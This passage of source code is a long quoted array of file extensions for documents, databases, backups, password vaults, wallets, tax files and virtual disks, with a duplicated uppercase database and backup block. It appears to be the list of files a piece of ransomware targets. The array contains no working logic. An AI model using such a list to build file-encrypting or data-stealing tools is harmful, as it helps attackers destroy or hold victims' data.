				"hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2", "hpd", "hpj",
				"hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx", "hs", "hs2",
				"hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg", "htm", "htm~",
				"html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc", "HVE", "hvpl",
				"hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN", "hxq", "hxr",
				"hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02", "i5z", "iab",
				"iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb", "ibcd", "ibd",
				"ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo", "icbu", "icc",
				"icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics", "icst", "icxs",
				"id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml", "idp", "idx",
				"ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff", "ifiction", "ifm",
				"ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr", "ihf", "ihp",
				"ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg", "ilogicvb", "ima",
				"image", "imd", "img", "imp", "imr", "imt", "imz", "in", "INBOX", "INC",
				"incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp", "indt", "inf",
				"info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins", "inss", "installhelper",
				"insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias", "ipd", "ipf",
				"iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock", "irp", "irr",
				"irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso", "ispc", "ispx",
				"ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm", "itmsp", "itmz",
				"itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc", "ivd", "ivs",
				"ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj", "iwtpl", "iwxdata",
				"ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar", "jasper", "jav",
				"java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr", "jc", "jclic",
				"JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif", "JFM", "jgcscs",
				"jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp", "jnb", "jnt",
				"joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg", "jpf", "jpg",
				"jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint", "JRS", "jrxml",
				"js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx", "jtbackup", "jtd",
				"jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww", "k25", "k3b",
				"kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2", "kdb", "kdbx",
				"kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi", "kexic", "kexis",
				"key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp", "kgtemp", "kid",
				"kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno", "knt", "kos",
				"kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd", "ksm", "ksp",
				"kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp", "l", "l01",
				"l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat", "latex", "lav",
				"lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx", "lcb", "lcd",
				"lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldif", "lef", "lev",
				"lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf", "lgh", "lgi", "lgl",
				"lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life", "lin", "list", "lit",
				"litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb", "llv", "llx", "LM",
				"lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt", "lnx", "LO_", "loc",
				"localstorage", "LOG1", "logonxp", "lok", "lot", "lp", "lp2", "lp7", "lpa", "lpc",
				"lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd", "lpp", "lpx", "lqm", "lrcat",
				"lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit", "ls3", "ls5", "lsa", "lsd",
				"lsf", "lsl", "lsp", "lsr", "lst", "lsu", "ltcx", "ltm", "ltr", "LTS",
				"ltx", "lua", "lud", "lut", "lutx", "lvd", "lvivt", "lvl", "lvm", "lvw",
				"lw4", "lwd", "lwo", "lwp", "lwx", "lx01", "lxf", "lxk", "ly", "lyt",
				"lyx", "m", "m13", "m14", "m2", "m2ts", "m3u", "m3u8", "m4a", "m4p",
				"m4u", "m4v", "m7p", "maca", "maf", "mag", "mai", "maker", "maml", "man",
				"manu", "map", "mapimail", "MAPSTYLE", "maq", "mar", "marc", "markdn", "mars", "marshal",
				"mas", "mass", "mat", "mav", "max", "maxfr", "maxm", "mba", "mbbk", "mbd",
				"mbf", "mbg", "mbi", "mbox", "mbp", "mbx", "mc1", "mc9", "mcat", "mcd",
				"mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp", "mcrp", "mcw", "mcx", "md",
				"md0", "md1", "md2", "md3", "md5", "md8", "mdbackup", "mdbhtml", "mdc", "mdccache",
				"mdd", "mddata", "mdg", "mdi", "mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn",
				"mds", "mdsx", "MDT", "mdx", "MDZ", "mecontact", "med", "mef", "meg", "mega",
				"meh", "mell", "mellel", "mem", "menc", "menu", "meo", "merlin2", "met", "METADATA",
				"metadata_never_index", "mex", "mf", "mf4", "mfa", "mfe", "mfl", "mfo", "mfp", "mft",
				"mfu", "mfv", "mfw", "mga", "mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht",
				"mhtenx", "mhtmlenx", "mi", "mic", "mid", "mif", "mim", "mime", "mindnode", "miniso",
				"mip", "mission", "mix", "mjd", "mjdoc", "mjk", "mkd", "mke", "mkv", "mla",
				"mlb", "mlc", "mlj", "mlm", "mls", "mlsxml", "mlx", "mm", "mm6", "mm7",
				"mm8", "mmap", "mmc", "mmd", "mme", "mmf", "mmjs", "mml", "mmm", "mmo",
				"mmp", "mmsw", "mmw", "mnc", "mng", "MNI", "mnk", "mno", "mny", "mo",
				"mobi", "mod", "MODEL", "MOF", "moho", "mol", "money", "moneywell", "mos", "mosaic",
				"mov", "movie", "mox", "moz", "mp1", "mp2", "mp4v", "mpa", "mpd", "mpe",
				"mpeg", "mpf", "mpg", "mph", "mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge",
				"mpr", "mps", "mpt", "mpv", "mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg",
				"mru", "mrw", "mrwref", "ms", "ms10", "msb", "msc", "msct", "msd", "mse",
				"msf", "msg", "mshc", "msie", "msim", "msl", "mso", "msor", "msp", "msq",
				"mss", "ms-tnef", "msw", "mswd", "mtdd", "mte", "mtf", "mtff", "mth", "MTL",
				"mtm", "mtml", "mto", "mtp", "mts", "mtw", "mtx", "mtxt", "mud", "mug",
				"mui", "mum", "mup", "mvd", "mvdx", "mvex", "mvm", "mw", "mwb", "mwd",
				"mwf", "mwii", "mwpd", "mwpp", "mws", "mwx", "mx", "mxad", "mxc2", "mxd",
				"mxg", "mxi", "mxl", "mxp", "myd", "mydocs", "myi", "myo", "mz", "n3",
				"nam", "names", "nap", "narrative", "nas", "nav", "navmap", "nb", "nb7", "nba",
				"nbak", "nbd", "nbe", "nbf", "nbi", "nbk", "nbp", "nbs", "nbu", "nc",
				"ncd", "ncf", "nco", "ncorx", "nct", "nd", "nda", "ndb", "ndd", "ndif",
				"ndk", "ndl", "ndr", "nds", "ndx", "ne1", "ne3", "nef", "nessus", "net",
				"neta", "netspd", "netspm", "NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs",
				"nfs11save", "ng", "NGR", "nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP",
				"NLT", "nma", "nmbtemplate", "nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni",
				"NNM", "nnp", "nnt", "nokogiri", "nop", "not", "note", "notebook", "now", "noy",
				"np", "npd", "npdf", "npf", "npl", "npp", "npr", "nps", "npt", "npy",
				"nrb", "nrbak", "nrc", "nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib",
				"nrs", "nrt", "nru", "nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsg",
				"nsh", "nsq", "nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx",
				"NU2", "number", "numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl",
				"nvl", "nvm", "nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo",
				"nwp", "nws", "nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3",
				"oab", "oad", "oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt",
				"obx", "obz", "occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc",
				"odccubefile", "odf", "odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods",
				"odt", "odt#", "odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui",
				"ofm", "ofn", "oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu",
				"ogs", "oil", "ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event",
				"olk14group", "olk14note", "olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg",
				"omlog", "omp", "onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos",
				"oot", "op", "op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju",
				"oplx", "opn", "opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5",
				"or6", "ora", "orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd",
				"osdx", "ost", "osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl",
				"otln", "otn", "otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd",
				"ovf", "ovolog", "ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01",
				"p10", "p12", "p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c",
				"p7x", "p7z", "p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef",
				"pak", "pan", "paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf",
				"pbix", "pbj", "PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap",
				"pcapng", "pcb", "pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS",
				"pct", "pcv", "pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr",
				"pdd", "pdf", "pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl",
				"pdfua", "pdfvt", "pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp",
				"pds", "pdw", "pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes",
				"pex", "pez", "pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx",
				"pg", "pgd", "pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih",
				"pixexp", "pj2", "pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey",
				"pkg", "pkh", "pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc",
				"pld", "pli", "pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3",
				"pm4", "pm5", "pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo",
				"pmr", "pmt", "pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC",
				"pod", "poi", "pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp",
				"pp2", "pp3", "ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps",
				"ppsenx", "ppsm", "ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt",
				"pptx", "ppws", "ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2",
				"prj", "prn", "pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd",
				"pro5pl", "pro5plx", "pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs",
				"prt", "prtc", "prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3",
				"psb", "psd", "PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm",
				"PSM1", "psmd", "pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx",
				"psz", "pt3", "pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2",
				"pts", "ptx", "PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz",
				"pvd", "pve", "pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf",
				"pwi", "pwm", "pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp",
				"py", "pys", "pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015",
				"qb2016", "qb2017", "qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb",
				"qbmd", "qbr", "qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct",
				"qdat", "qdb", "qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel",
				"qf", "qfilter", "qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif",
				"qlgenerator", "qm", "qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx",
				"qrp", "qrt", "qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw",
				"QUE", "quiz", "quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt",
				"qxb", "qxd", "qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03",
				"r0f", "r0z", "r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap",
				"rar", "RAT", "ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk",
				"rbs", "rbt", "rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd",
				"rd1", "rda", "rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx",
				"rdo", "rdoc", "rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref",
				"reference", "rel", "rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW",
				"ret", "rev", "rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb",
				"rgmc", "rgn", "rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl",
				"rlf", "rll", "rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx",
				"rna", "rng", "rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx",
				"rodz", "rofl", "rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox",
				"roxio", "roz", "rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres",
				"rpt", "rptr", "rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc",
				"rsd", "rsdf", "rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv",
				"rsw", "rt", "rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk",
				"rtp", "rtpi", "rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel",
				"rum", "run", "rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg",
				"rwl", "rwlibrary", "rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn",
				"sa5", "sa7", "sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam",
				"sar", "sas7bdat", "sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn",
				"sbo", "sbpf", "sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4",
				"sc45", "sca", "scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs",
				"sch", "SCHEMA", "scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs",
				"scspack", "scssc", "sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda",
				"sdb", "sdc", "sdd", "sddraft", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo",
				"sdoc", "sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1",
				"SEARCH-MS", "secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server",
				"ses", "set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi",
				"sgl", "sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP",
				"shr", "shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn",
				"sidx", "sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky",
				"sla", "sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp",
				"slt", "slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi",
				"smlx", "smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2",
				"sna", "snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt",
				"snx", "so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg",
				"spj", "spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz",
				"sps", "spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql",
				"sqlite", "sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM",
				"SRD-WAL", "srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd",
				"ssh", "ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5",
				"st6", "st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti",
				"stk", "stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt",
				"stu", "stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf",
				"sum", "surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm",
				"svn", "svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch",
				"swk", "swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm",
				"sxml", "sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05",
				"t06", "t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15",
				"t16", "t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64",
				"t80", "ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab",
				"tabula-doc", "tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS",
				"tax", "tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17",
				"tax2008", "tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017",
				"tax2018", "tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx",
				"tbz2", "tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0",
				"tda", "TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr",
				"tdt", "te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter",
				"terrn", "terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa",
				"tfd", "tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz",
				"THA", "thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff",
				"tig", "time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld",
				"tlg", "tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME",
				"tml", "tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns",
				"tnsp", "toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb",
				"totalslayout", "tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu",
				"tpx", "tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk",
				"trm", "trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr",
				"tst", "tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17",
				"tt18", "tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt",
				"tu", "tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh",
				"twm", "tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm",
				"txn", "txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax",
				"ubj", "ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb",
				"udf", "udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr",
				"ulf", "uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d",
				"unr", "UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk",
				"upoi", "upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr",
				"ustar", "usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm",
				"uts", "utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf",
				"uxx", "v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd",
				"vbk", "vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4",
				"vc6", "vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd",
				"vcs", "vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx",
				"vec", "VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi",
				"vibe", "view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx",
				"vmdk", "vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx",
				"vmxf", "vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd",
				"vpk", "vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp",
				"vs", "vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm",
				"vssx", "vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud",
				"vvf", "vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02",
				"W2B", "w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w",
				"w8bn", "w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav",
				"wave", "waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi",
				"wbk", "wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp",
				"wcst", "wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl",
				"wdn", "wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep",
				"WER", "wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil",
				"wim", "win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3",
				"wk4", "wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll",
				"wls", "wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga",
				"wmk", "wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn",
				"wnk", "wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42",
				"wp5", "wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0",
				"wpd1", "wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps",
				"wpt", "wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2",
				"ws3", "ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh",
				"wsi", "wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp",
				"wtp", "wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx",
				"WWD", "wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn",
				"wzs", "x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML",
				"xamlx", "xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl",
				"xbt", "xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo",
				"xdoc", "xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf",
				"xfi", "xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml",
				"xgmml", "xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf",
				"xl", "xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff",
				"xline", "xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse",
				"xlshtml", "xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx",
				"xlv", "xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf",
				"xmi", "xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms",
				"xmt_bin", "xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj",
				"xpll", "xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx",
				"xrb", "xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl",
				"xslt", "xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps",
				"xtrl", "xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid",
				"xvl", "xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe",
				"xxx", "xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra",
				"ychat", "yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm",
				"yrcdat", "yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct",
				"ZFSENDTOTARGET", "zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps",
				"ztmp", "ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG",
				"DB", "BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP",
				"BAC", "AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS",
				"ZIP", "RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX",
				"DOC", "DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC",
				"ACCDE", "ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF",
				"ASK", "BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12",
				"CRYPT8", "CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL",
				"DBCRYPT12", "DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB",
				"DCT", "DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL",
				"ECO", "ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC",
				"FMP", "FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM",
				"GDB", "GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB",
				"ITW", "JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF",
				"MAQ", "MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD",
				"MWB", "MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV",
				"NV2", "NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96",
				"P97", "PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD",
				"ROD", "ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB",
